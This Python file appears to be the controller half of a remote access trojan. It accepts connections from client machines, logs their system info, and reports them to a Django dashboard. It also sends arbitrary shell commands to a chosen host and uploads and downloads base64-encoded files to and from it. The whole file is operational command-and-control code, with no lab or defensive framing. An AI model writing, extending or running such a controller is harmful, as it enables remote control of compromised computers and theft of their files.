import socket
import threading
import time
import json
import base64
import requests
from queue import Queue

class Con_Stor():
    def __init__(self, client_socket_object, addr):
        self.client_socket_object = client_socket_object
        self.addr = addr
        self.machine_info = str(client_socket_object.recv(1024).decode('ascii'))

    def read_file(self, path):
        try:
            with open(path, 'rb') as file_obj:
                return base64.b64encode(file_obj.read())
        except:
            return "[+] ERROR - Error opening file"
    def write_file(self, name, content):
        try:
            with open(name, 'wb') as file_obj:
                file_obj.write(base64.b64decode(content))
                return "[+] File downloaded successfully"
        except:
            return "[+] ERROR - Error during creating a file"    


    def json_send(self, data):
        for i in range(len(data)):
            word = data[i]
            if not isinstance(word, str):
                data[i] = word.decode('utf-8')
        
        json_data = json.dumps(data).encode('utf-8')
        self.client_socket_object.send(json_data)

    def json_receive(self):
        json_data = "" 
        while True:
            try:
                page = self.client_socket_object.recv(1024)
                json_data += page.decode('utf-8')
                return json.loads(json_data)
            except:
                continue
            

ACTIVE_CONNECTIONS = []

RESPONSE_DIRECTORY = {}

class Server:
    def __init__(self, ip, port, django_server):
        self.socket_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket_obj.bind((ip, port))
        self.django_server = django_server

        
    def manage_listen_and_add(self):
        self.socket_obj.listen(5)
        
        try:
            while True:
                client_conn_object, addr = self.socket_obj.accept()
                con_stor = Con_Stor(client_socket_object=client_conn_object,
                                    addr=addr)
                ACTIVE_CONNECTIONS.append(con_stor)
            
        except KeyboardInterrupt:
            pass

    def manage_POST_connection_objects(self):
        try:
            while True:
                data = {}
                for connection in ACTIVE_CONNECTIONS:
                    data[connection.addr[0]] = connection.machine_info
                
                try:
                    r = requests.post(url=self.django_server,
                                    data=data)
                except:
                    pass

                time.sleep(10)    
        except KeyboardInterrupt:
            pass

def execute_command(id, command):
    obj = ACTIVE_CONNECTIONS[id-1]
    command = command.split()

    if command[0] == "exit":
        ACTIVE_CONNECTIONS.pop(id-1)
        #RESPONSE_DIRECTORY[id] = "Closed Connection"
        return "Closed Connection"


    if command[0] == "upload":
        filename = command[1]
        data = obj.read_file(filename)
        command.append(data)
        
    obj.json_send(command)
    response = obj.json_receive()

    if command[0] == "download":
        data = response
        filename = command[1].split('/')[-1]
        obj.write_file(filename, response)
        #RESPONSE_DIRECTORY[id] =  "File Downloaded"
        return "Closed Connection"
    else:
        #RESPONSE_DIRECTORY[id] = response
        return response

def run_manager(ip, port, django_server):
    obj = Server(ip=ip, port=port,
                 django_server=django_server)
    
    listen_thread = threading.Thread(target=obj.manage_listen_and_add, daemon=True)
    command_thead = threading.Thread(target=obj.manage_POST_connection_objects, daemon=True)

    listen_thread.start()
    command_thead.start()

    listen_thread.join()
    command_thead.join()

    obj.socket_obj.close()